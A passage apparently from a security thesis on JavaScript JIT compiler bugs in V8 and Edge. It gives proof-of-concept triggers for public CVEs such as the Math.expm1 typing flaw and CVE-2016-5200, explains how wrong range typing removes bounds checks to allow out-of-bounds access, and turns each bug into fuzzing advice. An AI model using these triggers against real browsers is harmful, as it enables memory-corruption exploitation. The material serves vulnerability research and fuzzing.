172 https://blog.exodusintel.com/2020/02/24/a-eulogy-for-patch-gapping/ 
173 https://www.zerodayinitiative.com/advisories/ZDI-20-933/ 
174 https://twitter.com/_tsuro/status/1232477699131621376 
93 
4.5.4 Missing minus zero type or NaN information 
The previous chapter explained that side effects of built-in functions are annotated in 
JavaScript engines. The engines also annotate possible return value ranges for all built-in 
functions and use these ranges during optimization. For example, consider that a specific 
function can just return values between zero and five and that this return value is used as 
index to access an array. If the compiler can guarantee that the array has always a length of 
at least twenty - because of a previous check - bound checking code must not be added 
because the compiler can guarantee that the array access is always within bounds. 
However, if the annotated return value range is incorrect, it can immediately lead to an 
exploitable vulnerability. 
A common source for flaws is the kSafeInteger range in v8 which does not include the 
minus zero value. JavaScript differentiates between +0 and -0 and the difference is 
significant. For example, consider the Math.sign function which returns +1 for positive 
arguments and -1 for negative arguments. If the argument is zero, the value +0 gets returned. 
If the engine developers forgot to annotate the edge case where a -0 gets returned when the 
argument is minus zero, a problem occurs because the runtime value can be different to 
value assumed by the compiler. Moreover, an engine programmer may define the return 
value range as CreateRange(-1.0,1.0) and assume that this includes all above mentioned 
cases. However, this is incorrect because this range does not cover the minus zero value. 
This example was CVE-2016-5200 and exploitation details are explained below. The minus 
one to plus one range is defined as kMinutesOneToOne and this range also does not contain 
the NaN value which can result in similar problems. Another common range is PlainNumber 
or Union(PlainNumber, NaN) which do not contain the minus zero value. 
Examples: 
Chromium issue 880207 (2018) - Incorrect type information on Math.expm1 
01: function opt() { 
02:     // The compiler assumes an incorrect Math.exmp1() return value range 
03:     // and therefore assumes that the comparison is always false 
04:     return Object.is(Math.expm1(-0), -0);   
05: } 
06: console.log(opt());     // interpreted code output: true 
07: %OptimizeFunctionOnNextCall(opt); 
08: console.log(opt());     // compiled code output: false 
The output indicates a flawed optimization because the first output is true, but the second 
one is false. This vulnerability was initially declared by Röttger, the reporter of the 
vulnerability and a researcher at Google Project Zero, and the v8 developers as not 
exploitable. „The typing rule is wrong, it looks like it was a copy&paste mistake on my side. 
I agree with the analysis that this is probably not really exploitable“ 175. Two months after the 
initial report, Röttger explained in the bug tracker that the vulnerability is in fact exploitable. 
175 https://bugs.chromium.org/p/chromium/issues/detail?id=880207 
94 
The vulnerability is not only exploitable, it is highly reliable, it allows to leak data and achieve 
code execution and it has a rapid execution speed. The following cite is from Exodus 
Intelligence, a company focused on zero-day and n-day development: „Finally, in terms of 
reliable N-Day exploits for Chrome, there are much better bugs that could achieve speed 
and reliability, due to the bug characteristics. The prime candidate for such bugs are those 
that occur in the v8 JIT engine, such as _tsuro‘s [Röttger’s] excellent V8 bug in Math.expm1” 
176. 
Exploitation details can be found in 177 and in 178. In 2018 the vulnerability was used as part 
of the Krautflare CTF challenge for 35C3. Exploitation details for this challenge and therefore 
for the vulnerability can be found at 179. 
The vulnerability was initially incorrectly fixed and a regression test, which triggers the 
vulnerability at another code location, is shown below: 
01: function opt(x) { 
02:     return Object.is(Math.expm1(x), -0); 
03: } 
04: function g() { 
05:     return opt(-0); 
06: } 
07: opt(0); 
08: // Compile function optimistically for numbers (with fast inlined  
09: // path for Math.expm1). 
10: %OptimizeFunctionOnNextCall(opt); 
11: // Invalidate the optimistic assumption, deopting and marking non-number 
12: // input feedback in the call IC. 
13: opt("0"); 
14: // Optimize again, now with non-lowered call to Math.expm1. 
15: console.log(g()); 
16: %OptimizeFunctionOnNextCall(g); 
17: console.log(g()); // returns: false. expected: true. 
The function is first optimized for the case of numbers, then it is deoptimized by passing a 
string and later it is optimized again. Now the compiler also considers strings as possible 
arguments. In the initial PoC just numbers were passed which means that the compiler 
performs optimization optimistically for floating-point values which means that the 
Math.expm1() call is lowered to code which just handles floating-point values. The initial fix 
just fixed this floating-point related code. However, by passing once a string to the function, 
generic code is compiled by adding a call node to Math.expm1() which also contained the 
vulnerability. 
176 https://blog.exodusintel.com/2019/01/22/exploiting-the-magellan-bug-on-64-bit-chrome-desktop/ 
177https://docs.google.com/presentation/d/1DJcWByz11jLoQyNhmOvkZSrkgcVhllIlCHmal1tGzaw/edit#slide=id.
g52a72d9904_2_105 
178 https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/ 
179 https://www.jaybosamiya.com/blog/2019/01/02/krautflare/ 
95 
An alternative solution 180 from sakura sakura is to enforce a call node by using the call() 
syntax: 
01: let y = { a: -0 }; 
02: var result = Object.is(Math.expm1.call(Math.expm1, -0), y.a); 
The optimization, which replaces Math.expm1(-0) with +0, can be triggered in the initial 
typer, in the load elimination and in the simplified lowering phase during compilation. The 
return value of the function call can be used inside a call to Object.is(return_value, -
0) which would return at runtime true, however, the compiler would assume that the return 
value is always negative. The Object.is() call would be replaced by a SameValue node in 
the sea-of-nodes. If the vulnerability is triggered in one of the first phases, the typed 
optimization pass would replace the SameValue node with an ObjectIsMinusZero node 
which would be optimized away in a later constant folding pass because the compiler 
assumes that the value can never be minus zero. That means, that too much optimization 
would be performed which results in a function which always returns false. However, to 
exploit the vulnerability, the compiler must be tricked into performing calculations based on 
incorrect optimization, but the function should not completely be optimized away. The 
SameValue operation must be performed at runtime to ensure that true can be returned. 
Then, the compiler would perform subsequent optimizations with the incorrect assumed false 
value but at runtime true would get returned which leads to the incorrect removal of bound 
checks. 
To enforce this, the optimization must not be triggered in the typer or load elimination phase. 
Instead, it must be triggered in the later simplified lowering phase. This means, that the code 
must change between the phases to trigger the optimization only in the simplified lowering 
phase. Between these phases the escape analysis phase is performed. The escape analysis 
dematerializes object properties accesses if the object does not escape. That means, that 
the value can be wrapped inside an object which does not escape. This hides the 
optimization until escape analysis was performed. A more detailed explanation of escape 
analysis and dematerialization of objects can be found in chapter 4.5.5. The following PoC, 
taken from 181, demonstrates this: 
180 
https://docs.google.com/presentation/d/1DJcWByz11jLoQyNhmOvkZSrkgcVhllIlCHmal1tGzaw/edit#slide=id.g5
2a72d9904_2_105 
181 https://www.jaybosamiya.com/blog/2019/01/02/krautflare/ 
96 
01: function opt(x) { 
02:     var a = { zz: Math.expm1(x), yy: -0 }; // Wrapped in obj for esc. analysis 
03:     a.yy = Object.is(a.zz, a.yy); 
04:     return a.yy; 
05: } 
06: function trigger() { 
07:     var a = { z: 1.2 }; 
08:     a.z = opt(-0); 
09:     return (a.z + 0); // Real: 1, Feedback type: Range(0, 0) 
10: } 
11: opt(0); 
12: %OptimizeFunctionOnNextCall(opt); 
13: opt("0"); 
14: trigger(); 
15: %OptimizeFunctionOnNextCall(trigger); 
16: trigger(); 
The Math.expm1() call and the -0 value are wrapped inside an object to ensure that the 
incorrect optimization is performed after escape analysis dematerialized object a. This 
means, that the compiler always assumes an incorrect return value of false for the opt 
function. However, when -0 is passed, the function returns true which means the trigger 
function returns 1, but the compiler assumes a return value range of (0,0). Arithmetic 
operations like a multiplication can be applied on the value to create an arbitrary index which 
can be used to access an array. Since the compiler assumes that the value is always zero, 
the bound check gets removed and OOB access is possible. 
Generalization for variation analysis: 
• 
Similar vulnerabilities can be found by comparing the output of function invocations 
executed by with the interpreter and the compiler. If the results differ, it may indicate 
an incorrect annotation or optimization. This type of fuzzing is called differential 
fuzzing. Google Chrome already includes such fuzzers as demonstrated by 
Chromium issue 1053939 182. 
• 
A fuzzer should use the -0 or NaN values in mutations since these values can trigger 
range flaws. 
• 
A fuzzer should call a function after optimization with different argument types and 
trigger optimization again before the final call to the target function happens. This is 
shown in the second PoC in line 13 where the function is invoked with a string 
argument. This results in the insertion of more generic code during optimization and 
can therefore trigger bugs in other code locations. 
• 
A fuzzer should use the .call() syntax to enforce the use of call nodes. 
• 
A fuzzer should implement a mutation strategy which wraps values within objects 
which do not escape. This prevents early optimization and delays optimization to later 
phases. This results in different code getting tested during fuzzing and therefore 
increases the attack surface. 
182 https://bugs.chromium.org/p/chromium/issues/detail?id=1053939 
97 
Chromium issue 913296, CVE-2019-5755 – Incorrect type information on 
SpeculativeSafeIntegerSubtract 
01: function opt(trigger) { 
02:     return (trigger ? -0 : 0) - 0; 
03: } 
04: assertEquals(0, opt(false)); 
05: %OptimizeFunctionOnNextCall(opt); 
06: assertEquals(-0, opt(true)); // Failure: expected  found  
The function is optimized for the case that the argument is false which results in 0 – 0 = 0 
as return value. When the argument is changed, the result should become -0 – 0 = -0. 
However, since the function gets incorrectly optimized, the result remains to be 0. The root 
cause of this vulnerability is that the subtract operation gets translated to a 
SpeculativeSafeIntegerSubtract call node which had an incorrect return value range defined. 
The incorrect return value allows to access arrays OOB because array bound checks can 
incorrectly be removed by performing index calculations based on the return value. 
Exploitation details were already described in the Chromium issue 880207 analysis. 
Generalization for variation analysis: 
• 
This vulnerability again demonstrates that -0 should be used during fuzzing to trigger 
edge cases. Already simple test cases such as the above PoC can lead to exploitable 
vulnerabilities. 
Chromium issue 658114, CVE-2016-5200 – OOB read and write in asm.js 
01: opt = (function (stdlib, foreign, heap) { 
02:     "use asm"; 
03:     var ff = Math.sign; 
04:     var m32 = new stdlib.Int32Array(heap); 
05:     function f(v) { 
06:         m32[((1 - ff(NaN) >>> 0) % 0xdc4e153) & v] = 0x12345678; 
07:     } 
08:     return f; 
09: })(this, {}, new ArrayBuffer(256)); 
10: %OptimizeFunctionOnNextCall(opt); 
11: opt(0xffffffff); 
The first instruction invokes an anonymous function which returns function f, which is defined 
in lines 5 to 7. This inner function f is then optimized and called with 0xFFFFFFFF as 
argument. The optimization incorrectly removed bound checks because the Math.sign 
function annotation did not include NaN as a possible return value. 
Generalization for variation analysis: 
• 
A fuzzer should wrap functions in variables and call the variable as shown in line 3 
and 6. 
• 
A fuzzer should fuzz asm.js code as shown in line 2. 
• 
A fuzzer should create mathematical operations to calculate array indexes as shown 
in line 6. 
• 
A fuzzer should change values to NaN during mutations. 
98 
4.5.5 Escape analysis bugs 
Compilers execute various optimization phases and escape analysis is one of them. 
Typically, objects in functions are allocated on the heap because the lifetime of the object 
may not be bound to the function. For example, when the object is assigned to a global 
variable or it is used as return value, the object escapes the function context. Another 
possibility is that another function is called with the object passed as argument. Then, the 
other function could escape the object by assigning it to a global variable. To reduce the 
number of such cases, compilers attempt to inline function calls before performing escape 
analysis. 
If the object escapes, a heap allocation is required. However, if the compiler can guarantee 
that an object cannot escape, the compiler can instead allocate the object or its properties 
on the stack. Such an object is called a dematerialized object. This has a positive 
performance impact because stack allocations are a lot faster. During escape analysis the 
compiler determines which objects escape and which objects can be dematerialized. 
A flaw in this logic can lead to the escape of a dematerialized object. This means, a stack 
variable can be accessed although the stack frame is no longer valid which is similar to a 
use-after-free-like vulnerability on the stack and can therefore be exploited in most cases. 
Examples: 
Edge CVE-2018-0860 – JIT escape analysis bug 183 
01: function opt() { 
02:     let arr = []; 
03:     return arr['x']; 
04: } 
05: let arr = [1.1, 2.2, 3.3]; 
06: for (let i = 0; i < 0x10000; i++) { 
07:      opt();  // Trigger optimization 
08: } 
09: Array.prototype.__defineGetter__('x', Object.prototype.valueOf); 
10: print(opt()); 
The loop in line 6 triggers optimization of the opt function. Since the arr variable in the opt 
function is assumed to not escape, it gets dematerialized which means that it gets allocated 
on the stack. The getter function of the array prototype can be overwritten like done in line 
9. This could lead to a leak of the arr variable because the callback function could assign arr 
to a global variable. This is prevented by the compiler by adding code which results in 
deoptimization in case such a getter function gets called. 
However, this is only the case if the newly defined getter has a side effect which means that 
the variable can escape. In the above PoC the Object.prototype.valueOf built-in function is 
used as new getter because this function is internally annotated as HasNoSideEffect. 
Because it does not have a side effect, the optimized code invokes the function without 
183 https://bugs.chromium.org/p/project-zero/issues/detail?id=1437 
99 
triggering deoptimization. The valueOf function cannot be used to store arr in a global 
variable, however, it returns a pointer to its own object and therefore to arr. By triggering this 
callback in the return statement, the function can be tricked into returning a pointer to the arr 
variable. This means that the opt function leaks a pointer to a stack variable, although the 
stack frame is no longer valid. 
Generalization for variation analysis: 
• 
A fuzzer should add code which attempts to leak local variables to global variables 
through callbacks. 
• 
A fuzzer should trigger callbacks as part of the return statement and leak arguments 
to global variables. 
• 
A fuzzer should overwrite callback functions with built-in functions to identify other 
built-ins which can be used to escape variables. The focus should be put on built-in 
functions which are annotated as HasNoSideEffect. 
Edge CVE-2017-11918 – JIT escape analysis bug 184 
01: function opt() { 
02:     let tmp = []; 